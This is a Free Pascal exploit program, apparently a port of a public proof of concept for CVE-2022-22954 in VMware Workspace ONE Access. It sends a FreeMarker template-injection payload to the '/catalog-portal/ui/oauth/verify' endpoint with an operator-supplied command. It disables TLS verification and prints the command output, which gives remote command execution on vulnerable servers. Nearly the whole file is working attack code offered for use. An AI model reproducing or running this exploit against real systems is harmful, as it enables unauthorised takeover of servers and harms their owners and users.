{

the original PoC has been shared by the following

https://github.com/sherlocksecurity/VMware-CVE-2022-22954
https://twitter.com/HackerGautam/status/1513605802493644800

}



program exploit;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Classes, SysUtils,openssl,
  opensslsockets,CustApp, libcurl
  { you can add units after this };





type

  { TCVE }

  TCVE = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure stager; virtual;
    procedure WriteHelp; virtual;
  end;



{ TCVE }

procedure TCVE.DoRun;
var
  ErrorMsg: String;
begin
  // quick check parameters
  ErrorMsg:=CheckOptions('h i c ', 'help');
  if ErrorMsg<>'' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('h', 'help') then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  { add your program here }
   stager;
  // stop program loop
  Terminate;
end;

constructor TCVE.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:=True;
end;

destructor TCVE.Destroy;
begin
  inherited Destroy;
end;


 function EncodeUrl(url: string): string;
var
  x: integer;
  sBuff: string;
const
  SafeMask = ['A'..'Z', '0'..'9', 'a'..'z', '*', '@', '.', '_', '-'];
begin
  //Init
  sBuff := '';

  for x := 1 to Length(url) do
  begin
    //Check if we have a safe char
    if url[x] in SafeMask then
    begin
      //Append all other chars
      sBuff := sBuff + url[x];
    end
    else if url[x] = ' ' then
    begin
      //Append space
      sBuff := sBuff + '+';
    end
    else
    begin
      //Convert to hex
      sBuff := sBuff + '%' + IntToHex(Ord(url[x]), 2);
    end;
  end;

  Result := sBuff;
end;


function WriteData(Ptr: PChar; MemberSize, MemberCount: UIntPtr; var Data:
string): UIntPtr; cdecl;
var
  S: string;
begin
  SetString(S, Ptr, MemberSize * MemberCount);
  Data := Data + S;
  Result := MemberSize * MemberCount;
end;

function CurlGet(const Url: string; out Data: string; UserAgent: string =
''): Boolean;
var
  Curl: PCURL;
begin
  Data := '';
  Result := False;
  if Url = '' then
    Exit;
  Curl := curl_easy_init();
  if Curl = nil then
    Exit;
  try
    curl_easy_setopt(curl, CURLOPT_URL, [PChar(Url)]);
    if UserAgent <> '' then
      curl_easy_setopt(curl, CURLOPT_USERAGENT, [PChar(UserAgent)]);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, [@WriteData]);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, [@Data]);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, [0]);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, [0]);
    Result := curl_easy_perform(curl) = CURLE_OK;
  finally
    curl_easy_cleanup(Curl);
  end;
end;


procedure banner;
 var
   s : string;
begin
   s:= '[!] Coded by @zux0x3a '#10+'[+] 0xsp SRD '+#10+'[!] https://0xsp.com '+#10;

   writeln(s);
end;


procedure TCVE.stager;
var
  host,command,msg: string;

  payload,end_point,ending,final: string;

begin



  banner;

 host := getoptionvalue('i');
 command := getoptionvalue('c');
 if length(host) > 0 then  begin

  end_point := '/catalog-portal/ui/oauth/verify?error=&deviceUdid=';
  ending := '%22)%7D';
  payload := '$%7B%22freemarker.template.utility.Execute%22?new()(%22';
  final := encodeurl(command);

 CurlGet(host+end_point+payload+final+ending,msg,'Mozilla/5.0 (compatible; fpweb)')
end else
 writeln('[+] choose valid host e.g https://host');

 // write the content of payload
 writeln(msg);

end;

procedure TCVE.WriteHelp;
begin
  { add your help code here }
  writeln('Usage: ', ExeName, ' -h');
end;

var
  Application: TCVE;
begin
  Application:=TCVE.Create(nil);
  Application.Title:='CVE-2022-22954';
  Application.Run;
  Application.Free;
end.

